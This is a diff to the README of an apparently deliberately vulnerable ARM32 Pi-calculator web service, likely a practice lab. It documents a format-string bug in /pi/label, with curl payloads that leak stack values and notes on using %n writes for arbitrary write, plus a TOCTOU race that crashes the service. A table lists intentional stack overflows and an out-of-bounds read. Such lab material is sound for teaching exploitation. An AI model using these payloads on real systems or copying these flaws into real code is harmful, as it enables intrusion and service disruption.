@@ -207,6 +207,42 @@ curl http://localhost:8080/pi/status
 # {"running": true, "digit": 3, "place": 1}
 ```
 
+### POST /pi/label
+
+Sets a free-form label for the calculation and reflects it back. The body is the label content.
+
+```bash
+curl -X POST -d "build A" http://localhost:8080/pi/label
+# {"label": "build A"}
+```
+
+**Vulnerable:** the body is passed *as the format string* to `snprintf`, so conversion specifiers are evaluated against the calling stack/registers:
+
+```bash
+# Leak the first eight register/stack words at the snprintf call site.
+curl -X POST --data-raw '%x %x %x %x %x %x %x %x' \
+  http://localhost:8080/pi/label
+
+# Direct positional access. On ARM32 r3 holds the first vararg, then stack.
+curl -X POST --data-raw '%7$x' http://localhost:8080/pi/label
+
+# %s dereferences whatever happens to be in arg position as a char*. Most
+# values aren't valid pointers — expect crashes for free, the bug is real.
+# %n writes the running byte count to the pointer in arg position; combine
+# with the /pi/start stack overflow to plant a controlled target address.
+```
+
+### POST /pi/toggle
+
+Toggles the calculation between running and stopped. Empty body.
+
+```bash
+curl -X POST http://localhost:8080/pi/toggle
+# {"toggled": "started", "now_running": true}
+```
+
+**Vulnerable:** TOCTOU race on `m_running`. The handler reads `m_running`, sleeps 100 ms (the window), then acts on the stale value. The pi worker is a separate thread and naturally clears `m_running` when it completes — if that happens during the sleep, the handler still takes the `was_running == true` branch and calls `stop()`. The dangerous case is the inverse: `was_running == false` ⇒ the handler calls `PiCalculator::start()`, which move-assigns over `m_thread`. If the previous worker has finished but not been joined, that assignment hits `std::terminate()` and the service dies.
+
 ### GET /pi/digit?n=&lt;int&gt;
 
 Returns the nth digit of Pi as emitted by the spigot algorithm so far. Indexing is 1-based and matches the existing `/pi/status` `place` field — `n=1` is the leading `3`, `n=2` is `1`, `n=3` is `4`, and so on. The `computed` field reports how many digits have been finalised in the buffer.
@@ -299,6 +335,8 @@ Common useful gadgets for ARM32:
 | `POST /pi/start` | `handle_pi_start` | Stack overflow | Arbitrary code redirect | `strcpy` into 64-byte `config_buf` |
 | `POST /pi/stop` | `handle_pi_stop` | Stack overflow | Arbitrary code redirect | `sprintf("%s", body)` into 48-byte `reason_buf` |
 | `GET /pi/digit?n=N` | `handle_pi_digit` | OOB read | Arbitrary memory read | Unchecked signed int index into BSS digit buffer |
+| `POST /pi/label` | `handle_pi_label` | Format string | Arbitrary read **and write** | `snprintf(buf, n, body)` — body is the format string |
+| `POST /pi/toggle` | `handle_pi_toggle` | TOCTOU race | DoS via `std::terminate` | Stale `m_running` read across a sleep window |
 
 Stack-overflow offsets depend on compiler stack-frame layout — use GDB to determine them for your build.
 
